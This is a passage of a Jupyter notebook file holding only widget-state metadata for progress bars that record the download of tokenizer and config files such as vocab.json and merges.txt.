{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "f5a2fc624690457b95dd4853be8a6ffa": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_5e8dfac321f64ae3a490b3d619161cdc",
              "IPY_MODEL_2bc043a4eb0e4c23a8c0d18342edee78",
              "IPY_MODEL_a7c30c6af0894b0895ff5f674574b431"
            ],
            "layout": "IPY_MODEL_4392009d3b914876a7150acdc9138449"
          }
        },
        "5e8dfac321f64ae3a490b3d619161cdc": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_5de5d84c248940ebae521fed1765e9df",
            "placeholder": "​",
            "style": "IPY_MODEL_3c19135a26194e4c8cf0c9f63ef957ae",
            "value": "tokenizer_config.json: 100%"
          }
        },
        "2bc043a4eb0e4c23a8c0d18342edee78": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_e8ca10d07ffb4a91b90f4e8b74ef2030",
            "max": 614,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_b99136f46fa748c687d50699e8ff2e41",
            "value": 614
          }
        },
        "a7c30c6af0894b0895ff5f674574b431": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_ec28ea5ad2904309b71faa13d6984c73",
            "placeholder": "​",
            "style": "IPY_MODEL_e20deca00e114a15a83d1dd48df931c1",
            "value": " 614/614 [00:00&lt;00:00, 19.3kB/s]"
          }
        },
        "4392009d3b914876a7150acdc9138449": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "5de5d84c248940ebae521fed1765e9df": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3c19135a26194e4c8cf0c9f63ef957ae": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "e8ca10d07ffb4a91b90f4e8b74ef2030": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b99136f46fa748c687d50699e8ff2e41": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "ec28ea5ad2904309b71faa13d6984c73": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e20deca00e114a15a83d1dd48df931c1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "c4de7ef805b84fc2b43671571ce65141": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_c25b7ce70fa343ddb5634a088766ef60",
              "IPY_MODEL_eba680cbf613441cb307c8dd56e1e21b",
              "IPY_MODEL_306ad93acbae43fdad80b48aeeb96b69"
            ],
            "layout": "IPY_MODEL_bdec497d7ba04d6e8b3f29898a4dbc59"
          }
        },
        "c25b7ce70fa343ddb5634a088766ef60": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_43827468223c48578e2145bff2f3cb25",
            "placeholder": "​",
            "style": "IPY_MODEL_f245ac45941f4f20b62f3b2054831e7a",
            "value": "vocab.json: 100%"
          }
        },
        "eba680cbf613441cb307c8dd56e1e21b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_4595c76fdbe44d60810b777cd51ef81a",
            "max": 1042301,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_779d6a7367874d2997901f09dc6dfeb6",
            "value": 1042301
          }
        },
        "306ad93acbae43fdad80b48aeeb96b69": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8a8734daeb4a451aab3b77b44f40992c",
            "placeholder": "​",
            "style": "IPY_MODEL_e3350aefc4ec4dc5a5142b4a4d5cb5e9",
            "value": " 1.04M/1.04M [00:00&lt;00:00, 9.89MB/s]"
          }
        },
        "bdec497d7ba04d6e8b3f29898a4dbc59": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "43827468223c48578e2145bff2f3cb25": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f245ac45941f4f20b62f3b2054831e7a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "4595c76fdbe44d60810b777cd51ef81a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "779d6a7367874d2997901f09dc6dfeb6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "8a8734daeb4a451aab3b77b44f40992c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e3350aefc4ec4dc5a5142b4a4d5cb5e9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "77da329d253c4eb8805eccb0d90c7509": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_33b7489876274081b403b7635056ed2d",
              "IPY_MODEL_31ab2b6a7bf04c05b66c48dc9de3067c",
              "IPY_MODEL_48d8f28dd381437e9d70683094e8ca92"
            ],
            "layout": "IPY_MODEL_8e71b121895243f49702ef59f21845c0"
          }
        },
        "33b7489876274081b403b7635056ed2d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_333aca8c1ae34f4da8ca2d3fd0e8a2b9",
            "placeholder": "​",
            "style": "IPY_MODEL_e7baafaef9734443b8b5a34d679d7c52",
            "value": "merges.txt: 100%"
          }
        },
        "31ab2b6a7bf04c05b66c48dc9de3067c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_f6e416193b6a4e018c627f8934188460",
            "max": 456318,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_f5c37a1fa91e477b9d666e141cfbc6ce",
            "value": 456318
          }
        },
        "48d8f28dd381437e9d70683094e8ca92": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_c2e9627b09a04f789086456ee119046e",
            "placeholder": "​",
            "style": "IPY_MODEL_7f5e7db3fa7248b4b28107baf160e025",
            "value": " 456k/456k [00:00&lt;00:00, 7.14MB/s]"
          }
        },
        "8e71b121895243f49702ef59f21845c0": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "333aca8c1ae34f4da8ca2d3fd0e8a2b9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e7baafaef9734443b8b5a34d679d7c52": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "f6e416193b6a4e018c627f8934188460": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f5c37a1fa91e477b9d666e141cfbc6ce": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "c2e9627b09a04f789086456ee119046e": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "7f5e7db3fa7248b4b28107baf160e025": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "36a29e3610f44a6e902df80336e8c3f5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_920763394d984edfa7449737b159e2d5",
              "IPY_MODEL_6e6aef33ad59465d9aef5edf66b1a14f",
              "IPY_MODEL_c525951beb384455bd5481e490b58728"
            ],
            "layout": "IPY_MODEL_32259c48877b4838afa39705c85b49f1"
          }
        },
        "920763394d984edfa7449737b159e2d5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_6d7cafbd393d4ebb95030b4a6c6c518b",
            "placeholder": "​",
            "style": "IPY_MODEL_d62f47fa27a24b1cb93b300852821554",
            "value": "config.json: 100%"
          }
        },
        "6e6aef33ad59465d9aef5edf66b1a14f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_63331d84cc0e4d92b97b1484cec77902",
            "max": 642,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_aa46cde8bba44bc5b95954941b6a7751",
            "value": 642
          }
        },
        "c525951beb384455bd5481e490b58728": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_66126584f3b74cc6b97a1b9943dad91b",
            "placeholder": "​",
            "style": "IPY_MODEL_3db2c03c71bd4d8ebd118974f20bd32b",
            "value": " 642/642 [00:00&lt;00:00, 43.3kB/s]"
          }
        },
        "32259c48877b4838afa39705c85b49f1": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
